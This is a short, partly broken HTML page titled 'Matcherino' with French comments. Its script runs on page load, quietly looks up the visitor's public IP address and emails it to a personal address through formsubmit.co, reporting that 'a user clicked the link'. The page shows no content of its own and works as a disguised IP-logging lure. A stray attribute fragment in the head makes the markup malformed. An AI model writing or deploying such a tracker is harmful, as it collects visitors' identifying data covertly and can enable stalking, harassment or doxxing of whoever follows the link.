<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Matcherino</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
" onclick="toggle(1)">
<script>
    window.addEventListener('load', async function() {
    try {
        // Récupération de l'IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Préparation de l'envoi
        const formData = new FormData();
        formData.append("Message", "Un utilisateur a cliqué sur le lien");
        formData.append("IP", ipData.ip);
        formData.append("_captcha", "false");
        formData.append("_template", "table"); // Pour un mail bien présenté

        // Envoi AJAX
        const response = await fetch('https://formsubmit.co/ajax/code.codeur84@email.com', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            console.log("Succès : L'IP a été envoyée.");
        }
    } catch (error) {
        console.error("Erreur :", error);
    }
});
</script>
</body>
</html>
